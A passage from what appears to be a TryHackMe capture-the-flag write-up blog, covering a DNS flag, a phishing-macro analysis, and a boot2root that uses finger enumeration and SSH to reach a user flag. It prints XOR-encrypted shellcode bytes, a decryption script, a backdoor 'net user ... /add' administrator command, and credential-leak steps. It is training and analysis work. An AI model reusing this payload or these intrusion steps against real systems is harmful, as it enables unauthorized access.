+</span></span><span class="line"><span class="cl"><span class="p">;;</span> -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span class="m">37332</span>
+</span></span><span class="line"><span class="cl"><span class="p">;;</span> flags: qr rd ra<span class="p">;</span> QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: <span class="m">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">;;</span> QUESTION SECTION:
+</span></span><span class="line"><span class="cl"><span class="p">;</span>uplink-fallback.virelia-water.it.com. IN TXT
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">;;</span> ANSWER SECTION:
+</span></span><span class="line"><span class="cl">uplink-fallback.virelia-water.it.com. <span class="m">1799</span> IN TXT <span class="s2">&#34;eyJzZXNzaW9uIjoiVC1DTjEtMTcyIiwiZmxhZyI6IlRITXt1cGxpbmtfY2hhbm5lbF9jb25maXJtZWR9In0=&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">;;</span> Query time: <span class="m">135</span> msec
+</span></span><span class="line"><span class="cl"><span class="p">;;</span> SERVER: 10.255.255.254#53<span class="o">(</span>10.255.255.254<span class="o">)</span> <span class="o">(</span>UDP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">;;</span> WHEN: Mon Jun <span class="m">30</span> 15:56:14 EAT <span class="m">2025</span>
+</span></span><span class="line"><span class="cl"><span class="p">;;</span> MSG SIZE  rcvd: <span class="m">151</span>
+</span></span></code></pre></div><ul>
+<li>Decoded it to JSON:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">json
+</span></span><span class="line"><span class="cl">CopyEdit
+</span></span><span class="line"><span class="cl"><span class="o">{</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;session&#34;</span>: <span class="s2">&#34;T-CN1-172&#34;</span>,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;flag&#34;</span>: <span class="s2">&#34;THM{uplink_channel_confirmed}&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div>
+<h2 class="relative group">ORCAM 
+    <div id="orcam" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#orcam" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+<h3 class="relative group">Description 
+    <div id="description-4" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#description-4" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<blockquote>
+<p>Dr. Ayaka Hirano loves to swim with the sharks.
+So when the attackers from Virelia successfully retaliated against one of our own, it was up to the good doctor to take on the case.
+Will Dr. Hirano be able to determine how this attack happened in the first place?</p>
+<p>Artifact: <code>Writing_Template.eml</code></p></blockquote>
+
+<h3 class="relative group">Objective 
+    <div id="objective-1" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#objective-1" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Analyze the provided <strong><code>.eml</code></strong> file (email) and uncover the hidden flag in the format <strong><code>THM{...}</code></strong></p>
+
+<h3 class="relative group">Step 1: Analyzing the Email (Writing_Template.eml) 
+    <div id="step-1-analyzing-the-email-writing_templateeml" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-1-analyzing-the-email-writing_templateeml" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>The email contains:</p>
+<ul>
+<li>
+<p><strong>Sender:</strong> <strong><code>he1pdesk@orcam.thm</code></strong></p>
+</li>
+<li>
+<p><strong>Recipient:</strong> <strong><code>admin@orcam.thm</code></strong></p>
+</li>
+<li>
+<p><strong>Subject:</strong> <strong><code>Project Template</code></strong></p>
+</li>
+<li>
+<p><strong>Body:</strong></p>
+<blockquote>
+<p>&ldquo;Please use the following template for the upcoming Project. The file will not work unless you open it using administrative privileges. When prompted, enable macros in order to get all of the details.&rdquo;</p></blockquote>
+</li>
+<li>
+<p>Attachment:<code>Project_Template.docm</code>(a Word document with macros enabled).</p>
+</li>
+</ul>
+
+<h3 class="relative group">Observations 
+    <div id="observations" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#observations" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ul>
+<li>The email is suspicious because:
+<ul>
+<li>It urges the recipient to enable macros (a common malware delivery method).</li>
+<li>It asks for administrative privileges (unusual for a simple document).</li>
+</ul>
+</li>
+<li>The <code>.docm</code> extension confirms it contains macros.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat writing_template.eml 
+</span></span><span class="line"><span class="cl">Content-Type: multipart/mixed<span class="p">;</span> <span class="nv">boundary</span><span class="o">=</span><span class="s2">&#34;===============7147510528207607842==&#34;</span>
+</span></span><span class="line"><span class="cl">MIME-Version: 1.0
+</span></span><span class="line"><span class="cl">From: he1pdesk@orcam.thm
+</span></span><span class="line"><span class="cl">To: admin@orcam.thm
+</span></span><span class="line"><span class="cl">Subject: Project Template
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">--<span class="o">===============</span><span class="nv">7147510528207607842</span><span class="o">==</span>
+</span></span><span class="line"><span class="cl">Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span><span class="s2">&#34;us-ascii&#34;</span>
+</span></span><span class="line"><span class="cl">MIME-Version: 1.0
+</span></span><span class="line"><span class="cl">Content-Transfer-Encoding: 7bit
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Please use the following template <span class="k">for</span> the upcoming Project. The file will not work unless you open it using administrative privileges. When prompted, <span class="nb">enable</span> macros in order to get all of the details.
+</span></span><span class="line"><span class="cl">--<span class="o">===============</span><span class="nv">7147510528207607842</span><span class="o">==</span>
+</span></span><span class="line"><span class="cl">Content-Type: application/octet-stream
+</span></span><span class="line"><span class="cl">MIME-Version: 1.0
+</span></span><span class="line"><span class="cl">Content-Transfer-Encoding: base64
+</span></span><span class="line"><span class="cl">Content-Disposition: attachment<span class="p">;</span> <span class="nv">filename</span><span class="o">=</span><span class="s2">&#34;Project_Template.docm&#34;</span>
+</span></span><span class="line"><span class="cl">&lt;---------------------------SNIP-------------------------------&gt;
+</span></span></code></pre></div><p>I extracted the email attachment by copying the base64 text from the <code>.eml</code>  file and decoding it into another file:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat artifact.txt <span class="p">|</span> base64 -d &gt; Project_Template.docm 
+</span></span></code></pre></div>
+<h3 class="relative group">Step 2: Extracting the Malicious Macro 
+    <div id="step-2-extracting-the-malicious-macro" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-2-extracting-the-malicious-macro" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Since opening the file in LibreOffice gave macro errors, we need to manually inspect the VBA code.</p>
+
+<h3 class="relative group">Key Findings in the Macro: 
+    <div id="key-findings-in-the-macro" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#key-findings-in-the-macro" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>The document looked like this:</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="Opening_the_Attachment.png" src="/images/THM/Orcam/Opening_the_Attachment.png">
+
+  
+</figure>
+</p>
+<p>I then went ahead to open Macros:</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="Uncovered_Macros.png" src="/images/THM/Orcam/Uncovered_Macros.png">
+
+  
+</figure>
+</p>
+
+<h3 class="relative group">Step 3: Decrypting the Shellcode 
+    <div id="step-3-decrypting-the-shellcode" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-3-decrypting-the-shellcode" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>The shellcode is hidden in the <code>buf</code> array, XOR-encrypted with <code>&quot;l33t&quot;</code>.</p>
+
+<h3 class="relative group">Python Decryption Script: 
+    <div id="python-decryption-script" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#python-decryption-script" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>I copied this Section of the code and tried to decode it using this python script:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">buf</span> <span class="o">=</span> <span class="o">[</span>144,219,177,116,108,51,83,253,137,2,243,16,231,99,3,255,62,63,184,38,120,184,65,92,99,132,121,82,93,204,159,72,13,79,49,88,76,242,252,121,109,244,209,134,62,100,184,38,124,184,121,72,231,127,34,12,143,123,50,165,61,184,106,84,109,224,184,61,116,208,9,61,231,7,184,117,186,2,204,216,173,252,62,117,171,11,211,1,154,48,78,140,87,78,23,1,136,107,184,44,72,50,224,18,231,63,120,255,52,47,50,167,231,55,184,117,188,186,119,80,72,104,104,21,53,105,98,139,140,108,108,46,231,33,216,249,49,89,50,249,233,129,51,116,108,99,91,69,231,92,180,139,185,136,211,105,70,57,91,210,249,142,174,139,185,15,53,8,102,179,200,148,25,54,136,51,127,65,92,30,108,96,204,161,2,86,71,84,25,64,86,6,76,82,87,25,5,93,90,7,24,65,65,21,24,92,65,84,58,118,91,58,9,3,101,70,33,100,75,18,56,102,113,48,15,89,113,77,76,28,82,16,8,19,28,45,76,21,19,26,9,71,19,24,3,80,82,24,11,65,92,1,28,19,82,16,1,90,93,29,31,71,65,21,24,92,65,7,76,82,87,25,5,93,90,7,24,65,65,21,24,92,65,84,67,82,87,16,108<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">key</span> <span class="o">=</span> <span class="s2">&#34;l33t&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">decrypted</span> <span class="o">=</span> <span class="o">[]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> i in range<span class="o">(</span>len<span class="o">(</span>buf<span class="o">))</span>:
+</span></span><span class="line"><span class="cl">    decrypted.append<span class="o">(</span>buf<span class="o">[</span>i<span class="o">]</span> ^ ord<span class="o">(</span>key<span class="o">[</span>i % len<span class="o">(</span>key<span class="o">)]))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Convert to bytes</span>
+</span></span><span class="line"><span class="cl"><span class="nv">shellcode</span> <span class="o">=</span> bytes<span class="o">(</span>decrypted<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Print as string to look for THM{...}</span>
+</span></span><span class="line"><span class="cl">print<span class="o">(</span>shellcode.decode<span class="o">(</span><span class="s1">&#39;ascii&#39;</span>, <span class="nv">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="o">))</span>
+</span></span></code></pre></div><p>The key used above was found on the Macros.</p>
+
+<h3 class="relative group">Output Analysis 
+    <div id="output-analysis" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#output-analysis" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Running the script reveals:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ubuntu@tryhackme:~$ nano decrypt.py
+</span></span><span class="line"><span class="cl">ubuntu@tryhackme:~$ python3 decrypt.py 
+</span></span><span class="line"><span class="cl"><span class="sb">`</span>1dP0R
+</span></span><span class="line"><span class="cl">8u<span class="o">}</span><span class="p">;</span><span class="o">}</span><span class="nv">$uXX$fI</span>:I41 
+</span></span><span class="line"><span class="cl">           KXD$<span class="o">[[</span>aYZQ__Z<span class="o">]</span>jPh1o*
+</span></span><span class="line"><span class="cl">h&lt;<span class="p">|</span>
+</span></span><span class="line"><span class="cl">uGrojSnet user administrrator VEhNe0V2MWxfTUBDcjB9 /add /Y <span class="p">&amp;</span> net localgroup administrators administrrator /add
+</span></span><span class="line"><span class="cl">ubuntu@tryhackme:~$ <span class="nb">echo</span> <span class="s2">&#34;VEhNe0V2MWxfTUBDcjB9&#34;</span> <span class="p">|</span> base64 -d
+</span></span><span class="line"><span class="cl">ubuntu@tryhackme:~$ ls
+</span></span><span class="line"><span class="cl">Desktop  Documents  Downloads  Music  Pictures  Project_Template.docm  Public  Templates  Videos  artifact.txt  decrypt.py  snap
+</span></span><span class="line"><span class="cl">ubuntu@tryhackme:~$ <span class="nb">echo</span> <span class="s2">&#34;VEhNe0V2MWxfTUBDcjB9&#34;</span> <span class="p">|</span> base64 -d              
+</span></span><span class="line"><span class="cl">THM<span class="o">{</span>Ev1l_M@Cr0<span class="o">}</span>ubuntu@tryhackme:~$    
+</span></span></code></pre></div>
+<h3 class="relative group">Summary of the Investigation 
+    <div id="summary-of-the-investigation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#summary-of-the-investigation" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ol>
+<li><strong>Delivery Method:</strong> Phishing email with a malicious Word attachment.</li>
+<li><strong>Execution Trigger:</strong> Auto-executing macro (<strong><code>Document_Open()</code></strong> and <strong><code>AutoOpen()</code></strong>).</li>
+<li><strong>Payload:</strong> XOR-encrypted shellcode (key: <strong><code>&quot;l33t&quot;</code></strong>).</li>
+<li><strong>Malicious Actions:</strong>
+<ul>
+<li>Creates a backdoor admin user (<strong><code>administrrator</code></strong>).</li>
+<li>Contains the flag in base64 (<strong><code>VEhNe0V2MWxfTUBDcjB9</code></strong> → <strong><code>THM{Ev1l_M@Cr0}</code></strong>).</li>
+</ul>
+</li>
+</ol>
+
+<h2 class="relative group">Chess Industry 
+    <div id="chess-industry" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#chess-industry" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+<h3 class="relative group">Description 
+    <div id="description-5" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#description-5" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<blockquote>
+<p>This was a Boot2Root challenge, I forgot to copy its description but will update it here as soon as I stumble upon it!</p></blockquote>
+
+<h3 class="relative group">Step 1: Reconnaissance (Port Scanning) 
+    <div id="step-1-reconnaissance-port-scanning" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-1-reconnaissance-port-scanning" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>We start by scanning the target machine (<strong><code>10.10.94.121</code></strong>) to identify open ports and services.</p>
+
+<h3 class="relative group">Nmap Scan 
+    <div id="nmap-scan" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#nmap-scan" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@ip-10-10-187-39:~# nmap -sCV -T4 -p- 10.10.94.121
+</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-06-28 14:19 BST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> ip-10-10-94-121.eu-west-1.compute.internal <span class="o">(</span>10.10.94.121<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00015s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65532</span> closed ports
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">79/tcp open  finger  Linux fingerd
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_finger: No one logged on.<span class="se">\x</span>0D
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.52 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.52 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: PrecisionChess IoT - Smart Chessboard Control
+</span></span><span class="line"><span class="cl">MAC Address: 02:61:72:C9:A6:09 <span class="o">(</span>Unknown<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 20.04 seconds
+</span></span><span class="line"><span class="cl">root@ip-10-10-187-39:~# 
+</span></span></code></pre></div><p><strong>Findings:</strong></p>
+<ul>
+<li><strong>Port 22 (SSH)</strong> - OpenSSH 8.9p1 (Ubuntu)</li>
+<li><strong>Port 79 (finger)</strong> - Linux <strong><code>fingerd</code></strong> service</li>
+<li><strong>Port 80 (HTTP)</strong> - Apache 2.4.52 (Ubuntu)
+<ul>
+<li>Website: <strong>PrecisionChess IoT - Smart Chessboard Control</strong></li>
+</ul>
+</li>
+</ul>
+
+<h3 class="relative group">Step 2: Web Enumeration 
+    <div id="step-2-web-enumeration" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-2-web-enumeration" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Visiting <strong><code>http://10.10.94.121</code></strong> reveals a chess-themed IoT control panel.</p>
+
+<h3 class="relative group">Key Observations 
+    <div id="key-observations" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#key-observations" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ul>
+<li><strong>Under Construction</strong> banner (possible incomplete security)</li>
+<li><strong>Team Members</strong> (potential usernames: <strong><code>magnus</code></strong>, <strong><code>fabiano</code></strong>, <strong><code>hikaru</code></strong>)</li>
+<li><strong>Chessboard Status</strong> (Board-001 to Board-004, one offline)</li>
+</ul>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="Webpage.png" src="/images/THM/Chess_Industry/Webpage.png">
+
+  
+</figure>
+</p>
+
+<h3 class="relative group">Step 3: Exploiting the Finger Service (Port 79) 
+    <div id="step-3-exploiting-the-finger-service-port-79" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-3-exploiting-the-finger-service-port-79" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>The <strong>finger service</strong> (<strong><code>fingerd</code></strong>) is an old but fascinating protocol that reveals information about users on a system. It was commonly used in early UNIX systems (1970s-1990s) but is rarely seen today due to security risks.</p>
+<hr>
+
+<h3 class="relative group">What is the Finger Protocol? 
+    <div id="what-is-the-finger-protocol" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#what-is-the-finger-protocol" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ul>
+<li><strong>Purpose</strong>: Provides user information (login name, real name, terminal, idle time, etc.).</li>
+<li><strong>Port</strong>: <strong>TCP/79</strong></li>
+</ul>
+<p>The <strong><code>finger</code></strong> service can reveal user information.</p>
+
+<h3 class="relative group">Why Was It Dangerous? 
+    <div id="why-was-it-dangerous" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#why-was-it-dangerous" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ol>
+<li><strong>Information Leakage</strong>
+<ul>
+<li>Reveals usernames, login times, and even <strong><code>.plan</code></strong>/<strong><code>.project</code></strong> files.</li>
+<li>Example: In this CTF, <strong><code>finger fabiano@10.10.94.121</code></strong> exposed a <strong>base64 password</strong> in <strong><code>.plan</code></strong>.</li>
+</ul>
+</li>
+<li><strong>User Enumeration</strong>
+<ul>
+<li>Attackers could list valid usernames (<strong><code>finger @target</code></strong>).</li>
+</ul>
+</li>
+<li><strong>Historical Exploits</strong>
+<ul>
+<li>Some versions had buffer overflows (e.g., <strong>&ldquo;fingerd&rdquo; exploit in 1988 Morris Worm</strong>).</li>
+</ul>
+</li>
+</ol>
+
+<h3 class="relative group">Enumerate Users 
+    <div id="enumerate-users" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#enumerate-users" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">finger @10.10.94.121
+</span></span><span class="line"><span class="cl">finger fabiano@10.10.94.121
+</span></span><span class="line"><span class="cl">finger hikaru@10.10.94.121
+</span></span><span class="line"><span class="cl">finger magnus@10.10.94.121
+</span></span></code></pre></div><p>We discover something interesting under Fabiano:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@ip-10-10-187-39:~# finger fabiano@10.10.94.121
+</span></span><span class="line"><span class="cl">Login: fabiano        			Name: 
+</span></span><span class="line"><span class="cl">Directory: /home/fabiano            	Shell: /bin/bash
+</span></span><span class="line"><span class="cl">Never logged in.
+</span></span><span class="line"><span class="cl">No mail.
+</span></span><span class="line"><span class="cl">Project:
+</span></span><span class="line"><span class="cl">Reminders
+</span></span><span class="line"><span class="cl">Plan:
+</span></span><span class="line"><span class="cl"><span class="nv">ZmFiaWFubzpvM2pWVGt0YXJHUUkwN3E</span><span class="o">=</span>
+</span></span></code></pre></div><p>I tried decoding this string:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@ip-10-10-187-39:~# <span class="nb">echo</span> <span class="s2">&#34;ZmFiaWFubzpvM2pWVGt0YXJHUUkwN3E=&#34;</span> <span class="p">|</span> base64 -d
+</span></span><span class="line"><span class="cl">fabiano:o3jVTktarGQI07qroot@ip-10-10-187-39:~# 
+</span></span></code></pre></div><p>This decodes to something that looks like credentials for SSH.</p>
+
+<h3 class="relative group">Step 4: Initial Foothold via SSH 
+    <div id="step-4-initial-foothold-via-ssh" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-4-initial-foothold-via-ssh" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Using the discovered credentials:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@ip-10-10-187-39:~# ssh fabiano@10.10.94.121
+</span></span><span class="line"><span class="cl">The authenticity of host <span class="s1">&#39;10.10.94.121 (10.10.94.121)&#39;</span> can<span class="s1">&#39;t be established.
+</span></span></span><span class="line"><span class="cl"><span class="s1">ECDSA key fingerprint is SHA256:Dbhug683PbcwejGvtf6fe3Jk0Zg/5UheCErOHI6rbow.
+</span></span></span><span class="line"><span class="cl"><span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span class="line"><span class="cl"><span class="s1">Warning: Permanently added &#39;</span>10.10.94.121<span class="s1">&#39; (ECDSA) to the list of known hosts.
+</span></span></span><span class="line"><span class="cl"><span class="s1">fabiano@10.10.94.121&#39;</span>s password: 
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 22.04.5 LTS <span class="o">(</span>GNU/Linux 6.8.0-1030-aws x86_64<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com
+</span></span><span class="line"><span class="cl"> * Management:     https://landscape.canonical.com
+</span></span><span class="line"><span class="cl"> * Support:        https://ubuntu.com/pro
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> System information as of Sat Jun <span class="m">28</span> 13:31:23 UTC <span class="m">2025</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  System load:  0.19               Processes:             <span class="m">108</span>
+</span></span><span class="line"><span class="cl">  Usage of /:   17.8% of 19.31GB   Users logged in:       <span class="m">0</span>
+</span></span><span class="line"><span class="cl">  Memory usage: 44%                IPv4 address <span class="k">for</span> ens5: 10.10.94.121
+</span></span><span class="line"><span class="cl">  Swap usage:   0%
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> * Ubuntu Pro delivers the most comprehensive open <span class="nb">source</span> security and
+</span></span><span class="line"><span class="cl">   compliance features.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   https://ubuntu.com/aws/pro
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Expanded Security Maintenance <span class="k">for</span> Applications is not enabled.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="m">1</span> update can be applied immediately.
+</span></span><span class="line"><span class="cl"><span class="m">1</span> of these updates is a standard security update.
+</span></span><span class="line"><span class="cl">To see these additional updates run: apt list --upgradable
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Enable ESM Apps to receive additional future security updates.
+</span></span><span class="line"><span class="cl">See https://ubuntu.com/esm or run: sudo pro status
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">The programs included with the Ubuntu system are free software<span class="p">;</span>
+</span></span><span class="line"><span class="cl">the exact distribution terms <span class="k">for</span> each program are described in the
+</span></span><span class="line"><span class="cl">individual files in /usr/share/doc/*/copyright.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+</span></span><span class="line"><span class="cl">applicable law.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">fabiano@tryhackme-2204:~$ ls
+</span></span><span class="line"><span class="cl">user.txt
+</span></span><span class="line"><span class="cl">fabiano@tryhackme-2204:~$ cat user.txt
+</span></span><span class="line"><span class="cl">THM<span class="o">{</span>bishop_to_c4_check<span class="o">}</span>
+</span></span></code></pre></div><p>That gives us a foothold on to the target and we secure our first flag for this challenge.</p>
+
+<h3 class="relative group">Step 5: Privilege escalation 
